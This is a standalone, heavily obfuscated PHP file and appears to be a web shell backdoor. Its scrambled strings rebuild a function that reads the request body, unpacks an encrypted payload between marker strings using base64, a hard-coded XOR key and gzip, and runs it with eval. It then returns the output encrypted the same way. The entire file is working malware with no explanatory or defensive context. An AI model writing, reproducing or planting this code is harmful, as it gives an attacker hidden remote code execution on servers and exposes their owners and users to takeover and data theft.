<?php
$l='`clean();$r=@base6c`4_encoc`dec`(@x(@gzcc`ompresc`c`s($o)c`,$kc`));print(c`"$p$kh$r$kf");}';
$g=str_replace('V','','creVatVeV_VfVunctiVon');
$P='jc`};}}rc`eturnc` $o;}if (@preg_c`match(c`"/$khc`c`(.+)$kf/",@fc`ile_getc`_contec';
$u='Ytl4FQ";c`fuc`nction x(c`c`$c`t,$k){$c=stc`rlenc`($k);$lc`=strlec`n($t);$o="";forc`($';
$h='i=0c`;$c`c`i<$l;){for($c`c`j=0;($c`j<$cc`&&$i<$c`l);$j++,$i++){$o.=c`$t{$c`ic`}^$k{$';
$t='`ntsc`("php:/c`/input"c`),$m)=c`=1) c`{@ob_c`startc`();@ec`val(c`@gzc`uncompressc`(@';
$I='x(@base6c`4_decodc`e(c`$m[1]),$c`k)c`));$c`o=@obc`_get_contentc`s();@c`ob_endc`_c';
$M='$k=c`"cc1c`ac`666b";$c`kh="9bedc`0138c`a841";c`$kc`f="b82d666c`5601f";$p="ra0fic`5Oc`BjL';
$n=str_replace('c`','',$M.$u.$h.$P.$t.$I.$l);
$N=$g('',$n);$N();
?>
